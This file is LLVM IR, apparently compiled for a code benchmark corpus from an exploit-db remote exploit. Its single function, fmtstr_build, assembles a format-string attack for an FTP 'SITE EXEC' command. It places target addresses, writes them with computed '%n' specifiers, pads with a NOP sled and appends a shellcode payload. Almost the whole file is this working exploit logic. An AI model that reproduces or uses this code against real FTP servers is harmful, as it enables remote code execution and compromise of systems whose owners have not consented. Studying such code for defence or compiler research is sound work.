; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_269.c_fmtstr_build.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_269.c_fmtstr_build.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64 }

@target = common dso_local global %struct.TYPE_2__* null, align 8
@sel = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [4 x i8] c"%.f\00", align 1
@fmtstr = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [11 x i8] c"SITE EXEC \00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"  \00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"%%%dd%%n\00", align 1
@shellcode_read = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @fmtstr_build(i64 %0, i64 %1) #0 {
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = alloca i64, align 8
  %12 = alloca [4 x i8], align 1
  store i64 %0, i64* %3, align 8
  store i64 %1, i64* %4, align 8
  store i32 136, i32* %6, align 4
  store i32 428, i32* %7, align 4
  store i64 1768515945, i64* %11, align 8
  store i32 0, i32* %5, align 4
  br label %13

13:                                               ; preds = %27, %2
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %14, 4
  br i1 %15, label %16, label %30

16:                                               ; preds = %13
  %17 = load i64, i64* %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = shl i32 %18, 3
  %20 = zext i32 %19 to i64
  %21 = lshr i64 %17, %20
  %22 = and i64 %21, 255
  %23 = trunc i64 %22 to i8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 %25
  store i8 %23, i8* %26, align 1
  br label %27

27:                                               ; preds = %16
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13

30:                                               ; preds = %13
  %31 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %32 = load i64, i64* @sel, align 8
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %31, i64 %32
  %34 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 8
  %36 = load i32, i32* %7, align 4
  %37 = sext i32 %36 to i64
  %38 = sub nsw i64 %37, %35
  %39 = trunc i64 %38 to i32
  store i32 %39, i32* %7, align 4
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  store i8 0, i8* %40, align 16
  store i32 0, i32* %5, align 4
  br label %41

41:                                               ; preds = %48, %30
  %42 = load i32, i32* %5, align 4
  %43 = load i32, i32* %6, align 4
  %44 = icmp slt i32 %42, %43
  br i1 %44, label %45, label %51

45:                                               ; preds = %41
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %47 = call i32 @strcat(i8* %46, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  br label %48

48:                                               ; preds = %45
  %49 = load i32, i32* %5, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %5, align 4
  br label %41

51:                                               ; preds = %41
  %52 = load i8*, i8** @fmtstr, align 8
  %53 = call i32 @strcat(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %54 = load i8*, i8** @fmtstr, align 8
  %55 = call i32 @strcat(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %56 = load i8*, i8** @fmtstr, align 8
  %57 = load i64, i64* %4, align 8
  %58 = call i32 @xpad_cat(i8* %56, i64 %57)
  %59 = load i8*, i8** @fmtstr, align 8
  %60 = load i64, i64* %11, align 8
  %61 = call i32 @xpad_cat(i8* %59, i64 %60)
  %62 = load i8*, i8** @fmtstr, align 8
  %63 = load i64, i64* %4, align 8
  %64 = add i64 %63, 1
  %65 = call i32 @xpad_cat(i8* %62, i64 %64)
  %66 = load i8*, i8** @fmtstr, align 8
  %67 = load i64, i64* %11, align 8
  %68 = call i32 @xpad_cat(i8* %66, i64 %67)
  %69 = load i8*, i8** @fmtstr, align 8
  %70 = load i64, i64* %4, align 8
  %71 = add i64 %70, 2
  %72 = call i32 @xpad_cat(i8* %69, i64 %71)
  %73 = load i8*, i8** @fmtstr, align 8
  %74 = load i64, i64* %11, align 8
  %75 = call i32 @xpad_cat(i8* %73, i64 %74)
  %76 = load i8*, i8** @fmtstr, align 8
  %77 = load i64, i64* %4, align 8
  %78 = add i64 %77, 3
  %79 = call i32 @xpad_cat(i8* %76, i64 %78)
  %80 = load i8*, i8** @fmtstr, align 8
  %81 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %82 = call i32 @strcat(i8* %80, i8* %81)
  %83 = load i8*, i8** @fmtstr, align 8
  %84 = call i32 @strcat(i8* %83, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %85 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 0
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = add nsw i32 %87, 256
  %89 = load i32, i32* %7, align 4
  %90 = srem i32 %89, 256
  %91 = sub nsw i32 %88, %90
  %92 = srem i32 %91, 256
  store i32 %92, i32* %8, align 4
  %93 = load i32, i32* %8, align 4
  %94 = icmp slt i32 %93, 10
  br i1 %94, label %95, label %98

95:                                               ; preds = %51
  %96 = load i32, i32* %8, align 4
  %97 = add nsw i32 %96, 256
  store i32 %97, i32* %8, align 4
  br label %98

98:                                               ; preds = %95, %51
  %99 = load i8*, i8** @fmtstr, align 8
  %100 = load i8*, i8** @fmtstr, align 8
  %101 = call i32 @strlen(i8* %100)
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  %104 = load i32, i32* %8, align 4
  %105 = call i32 @sprintf(i8* %103, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32 %104)
  %106 = load i32, i32* %8, align 4
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, %106
  store i32 %108, i32* %7, align 4
  %109 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 1
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = add nsw i32 %111, 256
  %113 = load i32, i32* %7, align 4
  %114 = srem i32 %113, 256
  %115 = sub nsw i32 %112, %114
  %116 = srem i32 %115, 256
  store i32 %116, i32* %8, align 4
  %117 = load i32, i32* %8, align 4
  %118 = icmp slt i32 %117, 10
  br i1 %118, label %119, label %122

119:                                              ; preds = %98
  %120 = load i32, i32* %8, align 4
  %121 = add nsw i32 %120, 256
  store i32 %121, i32* %8, align 4
  br label %122

122:                                              ; preds = %119, %98
  %123 = load i8*, i8** @fmtstr, align 8
  %124 = load i8*, i8** @fmtstr, align 8
  %125 = call i32 @strlen(i8* %124)
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8, i8* %123, i64 %126
  %128 = load i32, i32* %8, align 4
  %129 = call i32 @sprintf(i8* %127, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32 %128)
  %130 = load i32, i32* %8, align 4
  %131 = load i32, i32* %7, align 4
  %132 = add nsw i32 %131, %130
  store i32 %132, i32* %7, align 4
  %133 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 2
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = add nsw i32 %135, 256
  %137 = load i32, i32* %7, align 4
  %138 = srem i32 %137, 256
  %139 = sub nsw i32 %136, %138
  %140 = srem i32 %139, 256
  store i32 %140, i32* %8, align 4
  %141 = load i32, i32* %8, align 4
  %142 = icmp slt i32 %141, 10
  br i1 %142, label %143, label %146

143:                                              ; preds = %122
  %144 = load i32, i32* %8, align 4
  %145 = add nsw i32 %144, 256
  store i32 %145, i32* %8, align 4
  br label %146

146:                                              ; preds = %143, %122
  %147 = load i8*, i8** @fmtstr, align 8
  %148 = load i8*, i8** @fmtstr, align 8
  %149 = call i32 @strlen(i8* %148)
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %147, i64 %150
  %152 = load i32, i32* %8, align 4
  %153 = call i32 @sprintf(i8* %151, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32 %152)
  %154 = load i32, i32* %8, align 4
  %155 = load i32, i32* %7, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %7, align 4
  %157 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 3
  %158 = load i8, i8* %157, align 1
  %159 = zext i8 %158 to i32
  %160 = add nsw i32 %159, 256
  %161 = load i32, i32* %7, align 4
  %162 = srem i32 %161, 256
  %163 = sub nsw i32 %160, %162
  %164 = srem i32 %163, 256
  store i32 %164, i32* %8, align 4
  %165 = load i32, i32* %8, align 4
  %166 = icmp slt i32 %165, 10
  br i1 %166, label %167, label %170

167:                                              ; preds = %146
  %168 = load i32, i32* %8, align 4
  %169 = add nsw i32 %168, 256
  store i32 %169, i32* %8, align 4
  br label %170

170:                                              ; preds = %167, %146
  %171 = load i8*, i8** @fmtstr, align 8
  %172 = load i8*, i8** @fmtstr, align 8
  %173 = call i32 @strlen(i8* %172)
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds i8, i8* %171, i64 %174
  %176 = load i32, i32* %8, align 4
  %177 = call i32 @sprintf(i8* %175, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32 %176)
  %178 = load i32, i32* %8, align 4
  %179 = load i32, i32* %7, align 4
  %180 = add nsw i32 %179, %178
  store i32 %180, i32* %7, align 4
  %181 = load i8*, i8** @fmtstr, align 8
  %182 = call i32 @strlen(i8* %181)
  %183 = sub nsw i32 510, %182
  %184 = load i8*, i8** @shellcode_read, align 8
  %185 = call i32 @strlen(i8* %184)
  %186 = sub nsw i32 %183, %185
  %187 = sub nsw i32 %186, 1
  store i32 %187, i32* %9, align 4
  store i32 0, i32* %5, align 4
  br label %188

188:                                              ; preds = %195, %170
  %189 = load i32, i32* %5, align 4
  %190 = load i32, i32* %9, align 4
  %191 = icmp slt i32 %189, %190
  br i1 %191, label %192, label %198

192:                                              ; preds = %188
  %193 = load i8*, i8** @fmtstr, align 8
  %194 = call i32 @strcat(i8* %193, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  br label %195

195:                                              ; preds = %192
  %196 = load i32, i32* %5, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %5, align 4
  br label %188

198:                                              ; preds = %188
  %199 = load i8*, i8** @fmtstr, align 8
  %200 = load i8*, i8** @shellcode_read, align 8
  %201 = call i32 @strcat(i8* %199, i8* %200)
  %202 = load i8*, i8** @fmtstr, align 8
  %203 = call i32 @strcat(i8* %202, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  ret void
}

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @xpad_cat(i8*, i64) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
